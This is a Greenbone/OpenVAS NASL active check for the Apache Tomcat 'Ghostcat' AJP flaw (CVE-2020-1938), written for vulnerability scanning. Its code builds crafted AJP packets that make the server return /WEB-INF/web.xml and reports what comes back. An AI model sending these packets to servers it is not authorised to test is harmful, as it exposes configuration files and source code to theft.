# SPDX-FileCopyrightText: 2020 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.143545");
  script_version("2025-07-11T05:42:17+0000");
  script_tag(name:"last_modification", value:"2025-07-11 05:42:17 +0000 (Fri, 11 Jul 2025)");
  script_tag(name:"creation_date", value:"2020-02-21 06:01:21 +0000 (Fri, 21 Feb 2020)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2021-02-24 12:15:00 +0000 (Wed, 24 Feb 2021)");

  script_cve_id("CVE-2020-1938");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Apache Tomcat AJP RCE Vulnerability (Ghostcat) - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2020 Greenbone AG");
  # nb: This is a protocol used by Apache Tomcat so "Web Servers" seems to fit the best
  script_family("Web Servers");
  script_dependencies("gb_apache_jserv_ajp_detect.nasl");
  script_require_ports("Services/ajp13", 8009);
  script_require_keys("apache/ajp/detected");

  script_tag(name:"summary", value:"Apache Tomcat is prone to a remote code execution (RCE)
  vulnerability in the AJP connector dubbed 'Ghostcat'.");

  script_tag(name:"vuldetect", value:"Sends a crafted AJP request and checks the response.");

  script_tag(name:"insight", value:"Apache Tomcat server has a file containing vulnerability, which
  can be used by an attacker to read or include any files in all webapp directories on Tomcat, such
  as webapp configuration files or source code.");

  script_tag(name:"affected", value:"Apache Tomcat versions prior 7.0.100, 8.5.51 or 9.0.31 when the
  AJP connector is enabled.

  Other products like JBoss or Wildfly which are using Tomcat might be affected as well.");

  script_tag(name:"solution", value:"- Update Apache Tomcat to version 7.0.100, 8.5.51, 9.0.31 or
  later

  - For other products using Tomcat please contact the vendor for more information on fixed
  versions");

  script_xref(name:"URL", value:"https://lists.apache.org/thread/bnys5lvg1875dsslkkx2vmwxv833l35x");
  script_xref(name:"URL", value:"https://tomcat.apache.org/security-9.html#Fixed_in_Apache_Tomcat_9.0.31");
  script_xref(name:"URL", value:"https://tomcat.apache.org/security-8.html#Fixed_in_Apache_Tomcat_8.5.51");
  script_xref(name:"URL", value:"https://tomcat.apache.org/security-7.html#Fixed_in_Apache_Tomcat_7.0.100");
  script_xref(name:"URL", value:"https://web.archive.org/web/20250114042903/https://www.chaitin.cn/en/ghostcat");
  script_xref(name:"URL", value:"https://www.cnvd.org.cn/flaw/show/CNVD-2020-10487");
  script_xref(name:"URL", value:"https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi");
  script_xref(name:"URL", value:"https://securityboulevard.com/2020/02/patch-your-tomcat-and-jboss-instances-to-protect-from-ghostcat-vulnerability-cve-2020-1938-and/");
  script_xref(name:"URL", value:"https://www.cisa.gov/known-exploited-vulnerabilities-catalog");
  script_xref(name:"CISA", value:"Known Exploited Vulnerability (KEV) catalog");

  exit(0);
}

include("byte_func.inc");
include("host_details.inc");
include("port_service_func.inc");
include("list_array_func.inc");

port = service_get_port(default: 8009, proto: "ajp13");

hosts_ip = make_list(get_host_ip());

# Available since GVM-10 / git commit 4ba1a59
if (defined_func("get_host_names")) {
  hosts_ip = make_list(hosts_ip, get_host_names());
  hosts_ip = make_list_unique(hosts_ip);
}

local_ip = this_host();
local_len = strlen(local_ip);

file = "/WEB-INF/web.xml";

foreach host_ip(hosts_ip) {

  host_len = strlen(host_ip);

  ajp_data = raw_string(0x02,                                                         # Code (FORWARD_REQUEST)
                        0x02,                                                         # Method (GET)
                        0x00, 0x08, "HTTP/1.1", 0x00,                                 # Version
                        0x00, 0x01, "/", 0x00,                                        # URI
                        mkword(local_len), local_ip, 0x00,                            # Remote Address
                        0xff, 0xff,                                                   # Remote Host
                        mkword(host_len), host_ip, 0x00,                              # SRV
                        0x00, 0x50,                                                   # PORT (80)
                        0x00,                                                         # SSLP (FALSE)
                        0x00, 0x02,                                                   # NHDR
                        0xa0, 0x0b,
                        mkword(host_len), host_ip, 0x00,
                        0x00, 0x0f, "Accept-Encoding", 0x00,
                        0x00, 0x08, "identity", 0x00,
                        0x0a, 0x00, 0x0f, "AJP_REMOTE_PORT", 0x00,
                        0x00, 0x05, "38434", 0x00,
                        0x0a, 0x00, 0x22, "javax.servlet.include.servlet_path", 0x00,
                        0x00, 0x10, file, 0x00,
                        0x0a, 0x00, 0x21, "javax.servlet.include.request_uri", 0x00,
                        0x00, 0x01, "1", 0x00, 0xff);

  pkt_len = strlen(ajp_data);

  ajp_pkt = raw_string(0x12, 0x34,      # Magic
                       mkword(pkt_len), # Length
                       ajp_data);

  if (!sock = open_sock_tcp(port))
    continue;

  send(socket: sock, data: ajp_pkt);
  recv = recv(socket: sock, length: 8192);

  if (recv && strlen(recv) >= 7) {
    status = getword(blob: recv, pos: 5);
    if (hexstr(recv[4]) == "04" && status == 200) {

      close(sock);

      # nb:
      # - Store the reference from this one to gb_apache_jserv_ajp_detect.nasl to show a
      #   cross-reference within the reports
      # - We don't want to / can't use get_app_* functions and we're only interested in the
      #   cross-reference here
      register_host_detail(name: "detected_by", value: "1.3.6.1.4.1.25623.1.0.108082"); # gb_apache_jserv_ajp_detect.nasl
      register_host_detail(name: "detected_at", value: port + "/tcp");

      report = 'It was possible to read the file "' + file + '" through the AJP connector.\n\nResult:\n\n' + recv;
      security_message(port: port, data: report);
      exit(0);
    }

    # nb: Some systems answering with a "400" status code and a "No Host matches server name" message.
    # If there are false positives reported we might need to exclude the 400 status code here.
    if (hexstr(recv[4]) == "04" && status != 403) {

      close(sock);

      # nb:
      # - Store the reference from this one to gb_apache_jserv_ajp_detect.nasl to show a
      #   cross-reference within the reports
      # - We don't want to / can't use get_app_* functions and we're only interested in the
      #   cross-reference here
      register_host_detail(name: "detected_by", value: "1.3.6.1.4.1.25623.1.0.108082"); # gb_apache_jserv_ajp_detect.nasl
      register_host_detail(name: "detected_at", value: port + "/tcp");

      report = "The returned status is '" + status + "', which should be '403' on a patched system, when trying to " +
               "read a file which indicates that the installation is vulnerable.";
      security_message(port: port, data: report);
      exit(0);
    }
  }

  ajp_data = raw_string(0x02,                                                         # Code (FORWARD_REQUEST)
                        0x02,                                                         # Method (GET)
                        0x00, 0x08, "HTTP/1.1", 0x00,                                 # Version
                        0x00, 0x05, "/asdf", 0x00,                                    # URI
                        mkword(local_len), local_ip, 0x00,                            # Remote Address
                        0xff, 0xff,                                                   # Remote Host
                        mkword(host_len), host_ip, 0x00,                              # SRV
                        0x00, 0x50,                                                   # PORT (80)
                        0x00,                                                         # SSLP (FALSE)
                        0x00, 0x09,                                                   # NHDR
                        0xa0, 0x06, 0x00, 0x0a,
                        "keep-alive", 0x00,
                        0x00, 0x0f, "Accept-Language", 0x00,
                        0x00, 0x0e, "en-US,en;q=0.5", 0x00,
                        0xa0, 0x08, 0x00, 0x01, 0x30, 0x00, # 0
                        0x00, 0x0f, "Accept-Encoding", 0x00,
                        0x00, 0x13, "gzip, deflate, sdch", 0x00,
                        0x00, 0x0d, "Cache-Control", 0x00,
                        0x00, 0x09, "max-age=0", 0x00,
                        0xa0, 0x0e, 0x00, 0x07, "Mozilla", 0x00,
                        0x00, 0x19, "Upgrade-Insecure-Requests", 0x00,                # Upgrade-Insecure-Requests 1
                        0x00, 0x01,
                        0x31, 0x00,
                        0xa0, 0x01, 0x00, 0x09, "text/html", 0x00,
                        0xa0, 0x0b, mkword(host_len), host_ip,                        # Remote IP
                        0x00,
                        0x0a, 0x00, 0x21, "javax.servlet.include.request_uri", 0x00,
                        0x00, 0x01, "/", 0x00,
                        0x0a, 0x00, 0x1f, "javax.servlet.include.path_info", 0x00,
                        0x00, 0x10, file, 0x00,
                        0x0a, 0x00, 0x22, "javax.servlet.include.servlet_path", 0x00,
                        0x00, 0x01, "/", 0x00,
                        0xff);

  pkt_len = strlen(ajp_data);

  ajp_pkt = raw_string(0x12, 0x34,      # Magic
                       mkword(pkt_len), # Length
                       ajp_data);

  send(socket: sock, data: ajp_pkt);
  recv = recv(socket: sock, length: 8192);

  close(sock);

  if (!recv || strlen(recv) < 7)
    continue;

  status = getword(blob: recv, pos: 5);
  if (hexstr(recv[4]) == "04" && status == 200) {

    # nb:
    # - Store the reference from this one to gb_apache_jserv_ajp_detect.nasl to show a
    #   cross-reference within the reports
    # - We don't want to / can't use get_app_* functions and we're only interested in the
    #   cross-reference here
    register_host_detail(name: "detected_by", value: "1.3.6.1.4.1.25623.1.0.108082"); # gb_apache_jserv_ajp_detect.nasl
    register_host_detail(name: "detected_at", value: port + "/tcp");

    report = 'It was possible to read the file "' + file + '" through the AJP connector.\n\nResult:\n\n' + recv;
    security_message(port: port, data: report);
    exit(0);
  }

  # nb: Some systems answering with a "400" status code and a "No Host matches server name" message.
  # If there are false positives reported we might need to exclude the 400 status code here.
  if (hexstr(recv[4]) == "04" && status != 403) {

    # nb:
    # - Store the reference from this one to gb_apache_jserv_ajp_detect.nasl to show a
    #   cross-reference within the reports
    # - We don't want to / can't use get_app_* functions and we're only interested in the
    #   cross-reference here
    register_host_detail(name: "detected_by", value: "1.3.6.1.4.1.25623.1.0.108082"); # gb_apache_jserv_ajp_detect.nasl
    register_host_detail(name: "detected_at", value: port + "/tcp");

    report = "The returned status is '" + status + "', which should be '403' on a patched system, when trying to " +
             "read a file which indicates that the installation is vulnerable.";
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(0);
